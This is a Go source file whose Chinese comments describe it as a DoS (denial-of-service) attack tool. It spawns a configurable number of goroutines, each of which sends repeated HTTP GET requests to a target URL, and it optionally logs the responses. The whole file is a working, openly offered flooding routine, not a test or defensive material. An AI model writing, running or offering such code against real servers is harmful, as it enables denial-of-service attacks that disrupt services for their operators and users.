package task

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

// Config DOS 配置内容
type Config struct {
	Log      string
	URL      string
	Query    string
	Routine  int
	ReqTimes int
}

// RoutineWork 开始协程，进行 DOS 攻击
func RoutineWork(c *Config, msg chan<- string) {

	// 开启 [Routine] 个协程
	for i := 1; i <= c.Routine; i++ {
		// 协程自执行函数
		go func(c *Config, msg chan<- string, i int) {

			for j := 1; j <= c.ReqTimes; j++ {

				// 请求地址
				addr := c.URL

				// 定义本次请求记录消息
				message := fmt.Sprintf("协程[%v]完成第[%v]次请求", i, j)

				// 附加信息
				if len(c.Query) > 4 {
					addr += fmt.Sprintf(c.Query, i, j)
				}

				// 获取响应
				resp, err := http.Get(addr)

				if err != nil {
					fmt.Println(err)
					continue
				}

				// 获取响应 BODY 信息
				buffer, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					fmt.Println(err)
					continue
				}

				// 写入日志
				if len(c.Log) > 1 {
					err := AppendFile(c.Log, message+"\n"+string(buffer)+"\n")
					if err != nil {
						fmt.Println(err)
						continue
					}
				}

				// 关闭响应
				err = resp.Body.Close()
				if err != nil {
					fmt.Println(err)
					continue
				}

				// 发送数据
				msg <- message

			}

			msg <- "" // 发送结束信号

		}(c, msg, i)
	}
}
